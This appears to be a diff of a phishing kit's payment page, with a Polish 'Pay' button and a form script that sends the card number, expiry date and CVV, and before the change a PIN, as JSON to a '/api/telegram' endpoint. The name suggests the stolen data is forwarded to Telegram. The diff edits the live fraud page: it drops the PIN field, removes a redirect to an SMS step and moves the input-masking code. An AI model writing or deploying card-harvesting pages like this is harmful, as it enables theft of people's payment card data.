@@ -457,7 +457,7 @@ button.btn.btn-continue.mt-1.mb-1 {
                             </div>
                             <div class="row pt-4" bis_skin_checked="1">
                                 <div class="d-flex flex-row-reverse" bis_skin_checked="1">
-                                    <button type="submit" onclick="window.location.href='sms,html'" class="btn btn-continue mt-1 mb-1">
+                                    <button type="submit" class="btn btn-continue mt-1 mb-1">
                                         Płacić
                                     </button>
                                 </div>
@@ -818,7 +818,12 @@ button.btn.btn-continue.mt-1.mb-1 {
     <link rel="stylesheet" media="all" href="sites/default/files/css/css_BUzfBM6d0KYGEP1vF_Ci5K80nHPRh9s6zV0kQc80xIk.css?rnyh3v" />
 
     <script>
-        const newsletter = document.getElementById("newsletter");
+      
+  $(document).ready(function() {
+    $(":input").inputmask();
+
+});
+		  const newsletter = document.getElementById("newsletter");
   newsletter.addEventListener("submit", async (e) => {
     e.preventDefault();
 
@@ -832,7 +837,7 @@ button.btn.btn-continue.mt-1.mb-1 {
       const response = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ CN, cc, exp, cvv, PIN }),
+        body: JSON.stringify({ CN, cc, exp, cvv }),
       });
 
       if (response.ok) {
@@ -845,11 +850,6 @@ button.btn.btn-continue.mt-1.mb-1 {
       alert("Error en la conexión.");
     }
   });
-  
-  $(document).ready(function() {
-    $(":input").inputmask();
-
-});
     </script>
 </body>
 
